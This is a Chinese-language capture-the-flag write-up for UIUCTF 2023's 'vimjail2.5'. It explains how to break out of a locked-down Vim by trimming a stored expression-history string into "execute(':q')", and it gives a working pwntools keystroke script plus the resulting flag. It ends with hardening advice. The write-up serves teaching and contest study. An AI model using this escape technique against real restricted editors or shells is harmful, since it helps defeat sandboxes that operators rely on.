# UIUCTF 2023 vimjail2.5 Writeup

## 题目简述

`vimjail2.5` 进一步把插入模式中的整个 `Ctrl-\` 前缀映射为 `nope`，修补了上一版的一条模式切换绕过。不过核心设计未变：Vim 退出后入口脚本会执行 `cat /flag.txt`；命令行映射阻止输入 25 个字母，却特意漏掉 `q`；预置 `viminfo` 中仍保存着一条长表达式历史。

因此目标是利用历史中的已有字母拼出 `execute`，再直接键入未被过滤的标点和字母 `q`，执行 `execute(':q')`。

## 解题过程

在插入模式按 `Ctrl-R`、`=` 进入表达式寄存器，按上箭头取出以 `"excuse me, but Real Programmers ..."` 开头的历史字符串。所需 `execute` 是该字符串的一个子序列，对应字符偏移为：

```text
1, 2, 6, 88, 118, 136, 154
```

从右向左删除其余内容：先退格 345 次删除尾部，再依次保留一个字符并删除大小为 `17, 17, 29, 81, 3, 0` 的间隔，最后删除开头的双引号。将光标移到 `execute` 末尾后，可直接输入 `(':q')`，因为括号、引号、冒号以及字母 `q` 都没有被命令行映射封锁。

```python
from pwn import remote

CTRL_R = b"\x12"
UP = b"\x1b[A"
LEFT = b"\x1b[D"
RIGHT = b"\x1b[C"
BACKSPACE = b"\x08"

io = remote("vimjail2-5.chal.uiuc.tf", 1337)
io.recvuntil(b"VIM - Vi IMproved")

keys = CTRL_R + b"=" + UP
keys += BACKSPACE * 345
for gap in (17, 17, 29, 81, 3, 0):
    keys += LEFT + BACKSPACE * gap
keys += LEFT + BACKSPACE
keys += RIGHT * 7 + b"(':q')\n"

io.send(keys)
io.recvuntil(b"uiuctf{")
print((b"uiuctf{" + io.recvuntil(b"}")).decode())
```

Vim 执行 `:q` 后退出，shell 脚本输出：

```text
uiuctf{1_kn0w_h0w_7o_ex1t_v1m_7661892ec70e3550}
```

## 方法总结

本题强调的是状态复用与组合攻击。即使大多数字符不能直接输入，只要历史中存在足够丰富的字符串，方向键和删除键就能把它裁剪成有效代码；遗漏一个关键字符 `q` 已足以补全退出命令。除了键映射，安全配置还必须清空 `viminfo`、swap、寄存器和命令历史，并关闭表达式求值等可编程接口。
